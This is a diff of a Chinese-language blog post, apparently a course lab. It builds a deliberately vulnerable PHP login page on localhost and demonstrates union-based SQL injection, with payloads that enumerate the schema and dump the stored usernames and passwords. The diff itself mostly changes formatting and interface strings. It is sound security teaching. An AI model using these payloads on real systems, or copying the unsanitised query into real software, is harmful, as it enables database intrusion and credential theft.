@@ -158,7 +158,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Zoeken">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -240,9 +240,61 @@
 <p>花花在安装的时候就是橙色的，原因是之前做的计网实验开启了IIS服务，与apache服务冲突了，所以关掉IIS服务就可以了，具体方法为：计算机——有键——管理——服务，找到IIS关闭即可。如果之前的数据库实验用的不是MySQL，而是SQL sever，则需要将SQL server服务也关闭，方法同上。</p>
 <h3 id="3、编写登录页和测试页"><a href="#3、编写登录页和测试页" class="headerlink" title="3、编写登录页和测试页"></a>3、编写登录页和测试页</h3><p>左键wampserver的小图标，打开www目录，进入，新建两个文件，login.php,test.php。编辑两个文件，代码如下：</p>
 <p>login.php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;网络安全作业二&lt;/title&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"> &lt;body &gt;</span><br><span class="line">&lt;form action=<span class="string">"test.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">  &lt;fieldset &gt;</span><br><span class="line">    &lt;legend&gt;自建sql注入平台&lt;/legend&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;用户名：&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;&lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;密  码：&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=<span class="string">"text"</span> name=<span class="string">"password"</span>&gt;&lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=<span class="string">"reset"</span> value=<span class="string">"重置"</span>&gt;&lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">  &lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="lang-php">&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;网络安全作业二&lt;/title&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;/head&gt;
+ &lt;body &gt;
+&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;
+  &lt;fieldset &gt;
+    &lt;legend&gt;自建sql注入平台&lt;/legend&gt;
+    &lt;table&gt;
+      &lt;tr&gt;
+        &lt;td&gt;用户名：&lt;/td&gt;
+        &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+        &lt;td&gt;密  码：&lt;/td&gt;
+        &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+        &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt;
+        &lt;td&gt;&lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+    &lt;/table&gt;
+  &lt;/fieldset&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
 <p>test.php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pwd=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$uname=$_POST[<span class="string">'username'</span>];</span><br><span class="line"><span class="comment">//echo "您当前执行的sql语句为：" ;</span></span><br><span class="line"><span class="comment">//echo "select * from admin where passward='$pwd' and name='$uname'&lt;br/&gt;";</span></span><br><span class="line"><span class="comment">//echo "&lt;hr&gt;";</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">''</span>,<span class="string">'sqlin'</span>); </span><br><span class="line"><span class="keyword">if</span>(mysqli_connect_errno())&#123;</span><br><span class="line">    printf(<span class="string">"连接失败:%s&lt;br&gt;"</span>,mysqli_connect_error());</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$result = $mysqli-&gt;query(<span class="string">"select * from admin where name='$uname'"</span>);</span><br><span class="line"><span class="comment">//print_r($result-&gt;fetch_array(MYSQLI_ASSOC));</span></span><br><span class="line"><span class="keyword">if</span>($row=mysqli_fetch_row($result))</span><br><span class="line">&#123;</span><br><span class="line">	printf (<span class="string">"%s : %s"</span>,$row[<span class="number">0</span>],$row[<span class="number">1</span>]);</span><br><span class="line">       	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"success！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"账号或密码错误！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line">$result-&gt;close();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="lang-php">&lt;?php
+$pwd=$_POST[&#39;password&#39;];
+$uname=$_POST[&#39;username&#39;];
+//echo &quot;您当前执行的sql语句为：&quot; ;
+//echo &quot;select * from admin where passward=&#39;$pwd&#39; and name=&#39;$uname&#39;&lt;br/&gt;&quot;;
+//echo &quot;&lt;hr&gt;&quot;;
+$mysqli = new mysqli(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;&#39;,&#39;sqlin&#39;); 
+if(mysqli_connect_errno()){
+    printf(&quot;连接失败:%s&lt;br&gt;&quot;,mysqli_connect_error());
+    exit();
+}
+$result = $mysqli-&gt;query(&quot;select * from admin where name=&#39;$uname&#39;&quot;);
+//print_r($result-&gt;fetch_array(MYSQLI_ASSOC));
+if($row=mysqli_fetch_row($result))
+{
+    printf (&quot;%s : %s&quot;,$row[0],$row[1]);
+           echo &quot;&lt;br&gt;&quot;;
+    echo &quot;success！&quot;;
+}
+else
+{
+    echo &quot;账号或密码错误！&quot;;
+}
+$mysqli-&gt;close();
+$result-&gt;close();?&gt;
+</code></pre>
 <p>然后在浏览器上输入<a href="http://localhost/login.php，即可进入登陆页面。" target="_blank" rel="noopener">http://localhost/login.php，即可进入登陆页面。</a></p>
 <p>不过目前还没有数据库信息，在wampserver小图标左键打开mysql,进入，默认无密码，建立名为sqlin的数据库，和名为admin的表，由于以前做过数据库实验，命令在此不在赘述。</p>
 <figure class="image-bubble">
@@ -261,9 +313,13 @@
             </figure>
 <p>这样环境就搭好了，可以开始注入了。</p>
 <h2 id="二、简单的sql注入"><a href="#二、简单的sql注入" class="headerlink" title="二、简单的sql注入"></a>二、简单的sql注入</h2><h3 id="判断有几个显示位。"><a href="#判断有几个显示位。" class="headerlink" title="判断有几个显示位。"></a>判断有几个显示位。</h3><p>输入如下:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' union select 1,2,3#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure>
+<pre><code class="lang-bash">用户名：1&#39; union select 1,2,3#
+密码：111（任意）
+</code></pre>
 <p>发现报错，显示位不是3，重试</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' union select 1,2#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure>
+<pre><code class="lang-bash">用户名：1&#39; union select 1,2#
+密码：111（任意）
+</code></pre>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -272,9 +328,13 @@
                 <div class="image-caption">_AHNB_05K_I_RL5_6_9LCH7.png</div>
             </figure>
 <p>显示位为两位</p>
-<h3 id="确定表有几列"><a href="#确定表有几列" class="headerlink" title="确定表有几列"></a>确定表有几列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' order by 3#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure>
+<h3 id="确定表有几列"><a href="#确定表有几列" class="headerlink" title="确定表有几列"></a>确定表有几列</h3><pre><code class="lang-bash">用户名：1&#39; order by 3#
+密码：111（任意）
+</code></pre>
 <p>报错，不是3列</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' order by 2#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure>
+<pre><code class="lang-bash">用户名：1&#39; order by 2#
+密码：111（任意）
+</code></pre>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -283,7 +343,9 @@
                 <div class="image-caption">G_I__P__36X9D_O_YK_OMO9.png</div>
             </figure>
 <p>表有2列</p>
-<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' union select 1,database() #</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure>
+<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><pre><code class="lang-bash">用户名：1&#39; union select 1,database() #
+密码：111（任意）
+</code></pre>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -292,7 +354,9 @@
                 <div class="image-caption">0FV6JIXIMQJY_WPE0~I__7T.png</div>
             </figure>
 <p>数据库名为sqlin</p>
-<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure>
+<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><pre><code class="lang-bash">用户名：1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+密码：111（任意）
+</code></pre>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -301,7 +365,9 @@
                 <div class="image-caption">X_7_7ZT1P~YPSMBJY`@_026.png</div>
             </figure>
 <p>表名为admin</p>
-<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：0<span class="string">' union select (select column_name from information_schema.columns where table_name='</span>admin<span class="string">' limit 0,1),(select column_name from information_schema.columns where table_name='</span>admin<span class="string">' limit 1,2)#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure>
+<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><pre><code class="lang-bash">用户名：0&#39; union select (select column_name from information_schema.columns where table_name=&#39;admin&#39; limit 0,1),(select column_name from information_schema.columns where table_name=&#39;admin&#39; limit 1,2)#
+密码：111（任意）
+</code></pre>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -310,7 +376,9 @@
                 <div class="image-caption">9KK6GFE1E52BIZXKGB90_NS.png</div>
             </figure>
 <p>列名为name,passward</p>
-<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' union select name,passward from admin#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure>
+<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><pre><code class="lang-bash">用户名：1&#39; union select name,passward from admin#
+密码：111（任意）
+</code></pre>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -321,7 +389,7 @@
 <p>得到用户名及密码</p>
 <p>（建表的时候把password拼错了）😂</p>
 <h2 id="三、注入漏洞修补"><a href="#三、注入漏洞修补" class="headerlink" title="三、注入漏洞修补"></a>三、注入漏洞修补</h2><p>由于select语句并没有对输入的用户名进行检测，而是拿来直接用，造成的注入漏洞，可以对输入的用户名进行长度限制，或者过滤。</p>
-
+<div><strong>🚩推荐阅读</strong>（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）<ul><li><a href="https://1187100546.github.io/2019/11/12/DVWA-SQL-Injection-Blind/">DVWA-SQL_Injection_Blind（sql盲注）</a></li><li><a href="https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/">DVWA-SQL_Injection(SQL注入)</a></li><li><a href="https://1187100546.github.io/2019/10/13/利用sqlmap注入dvwa/">利用sqlmap注入dvwa</a></li><li><a href="https://e1sewhere.github.io/2019/03/18/我的WafBypass之道-三篇笔记/">我的WafBypass之道 三篇笔记</a></li><li><a href="https://e1sewhere.github.io/2019/02/12/SQL注入脚本练习/">SQL注入脚本练习</a></li></ul></div>
         </div>
 
         <blockquote class="post-copyright">
@@ -329,7 +397,7 @@
     <div class="content">
         
 <span class="post-time">
-    Laatste update: <time datetime="2019-11-09T07:44:23.468Z" itemprop="dateUpdated">2019-11-09 15:44:23</time>
+    Last updated: <time datetime="2019-11-09T07:44:23.468Z" itemprop="dateUpdated">2019-11-09 15:44:23</time>
 </span><br>
 
 
@@ -508,7 +576,7 @@
                     </span>
                     
                         <span>
-                            Deze blog valt onder de <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International Licentie</a>.
+                            This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.
                         </span>
             </p>
     </div>
